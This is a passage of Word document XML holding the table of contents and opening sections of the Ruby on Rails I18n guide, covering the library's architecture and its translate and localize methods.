    <w:p w14:paraId="4F20998D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId503" w:anchor="2-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Setting the Locale from the Domain Name</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="30AF90F7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId504" w:anchor="2-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Setting the Locale from the </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>URL</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Params</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5A591CEF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId505" w:anchor="2-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Setting the Locale from the Client Supplied Information</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="27B7E86C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId506" w:anchor="3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Internationalizing your Application</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="555C4AC7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId507" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Adding Translations</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="50ADA270" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId508" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Passing variables to translations</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="303D7CFA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId509" w:anchor="3-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Adding Date/Time Formats</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="41F057F0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId510" w:anchor="3-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Localized Views</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3C6A7937" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId511" w:anchor="3-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Organization of Locale Files</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5BB90374" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId512" w:anchor="4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Overview of the I18n </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>API</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Features</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="63C65620" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId513" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Looking up Translations</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4AE2F36C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId514" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Interpolation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7FA1625A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId515" w:anchor="4-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Pluralization</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6D471B04" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId516" w:anchor="4-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Setting and Passing a Locale</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5BE46043" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId517" w:anchor="4-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Using Safe </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>HTML</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> Translations</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="634DD543" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId518" w:anchor="5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>How to Store your Custom Translations</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3BFB4CE6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId519" w:anchor="5-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Translations for Active Record Models</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="32C1DA10" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId520" w:anchor="5-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Overview of Other Built-In Methods that Provide I18n Support</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="51D76EBB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId521" w:anchor="6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Customize your I18n Setup</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="50BFCA62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId522" w:anchor="6-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Using Different Backends</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="68C3F242" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId523" w:anchor="6-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Using Different Exception Handlers</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4031B3F4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId524" w:anchor="7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Conclusion</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4DD179A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId525" w:anchor="8" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Contributing to Rails I18n</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="78349F41" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId526" w:anchor="9" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Resources</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="15CE8B89" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId527" w:anchor="10" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Authors</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2FCBB141" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="293"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId528" w:anchor="11" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Footnotes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="345BE414" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The Ruby I18n framework provides you with all necessary means for internationalization/localization of your Rails application. You may, however, use any of various plugins and extensions available, which add additional functionality or features. See the Rails </w:t>
      </w:r>
      <w:hyperlink r:id="rId529" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>I18n Wiki</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> for more information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4449A876" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 How I18n in Ruby on Rails Works</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D07E7F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Internationalization is a complex problem. Natural languages differ in so many ways (e.g. in pluralization rules) that it is hard to provide tools for solving all problems at once. For that reason the Rails I18n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> focuses on:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5191C0DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="294"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>providing support for English and similar languages out of the box</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA0488E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="294"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>making it easy to customize and extend everything for other languages</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230C55DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As part of this solution, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>every static string in the Rails framework</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — e.g. Active Record validation messages, time and date formats — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>has been internationalized</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, so </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>localization</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of a Rails application means “over-riding” these defaults.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B46D6CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 The Overall Architecture of the Library</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AB564E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Thus, the Ruby I18n gem is split into two parts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631AD463" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="295"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The public </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> of the i18n framework — a Ruby module with public methods that define how the library works</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1752C2F1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="295"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A default backend (which is intentionally named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Simple</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> backend) that implements these methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0D5D62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>As a user you should always only access the public methods on the I18n module, but it is useful to know about the capabilities of the backend.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C45D87" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It is possible (or even desirable) to swap the shipped Simple backend with a more powerful one, which would store translation data in a relational database, GetText dictionary, or similar. See section </w:t>
      </w:r>
      <w:hyperlink r:id="rId530" w:anchor="using-different-backends" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Using different backends</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C44F795" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.2 The Public I18n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CDAEC6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The most important methods of the I18n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6893F1C5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55AC7DD1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>translate # Lookup text translations</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55639690" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>localize  # Localize Date and Time objects to local formats</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0EAEFC25" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>These have the aliases #t and #l so you can use them like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2400"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="369AE437" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A0BC84B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
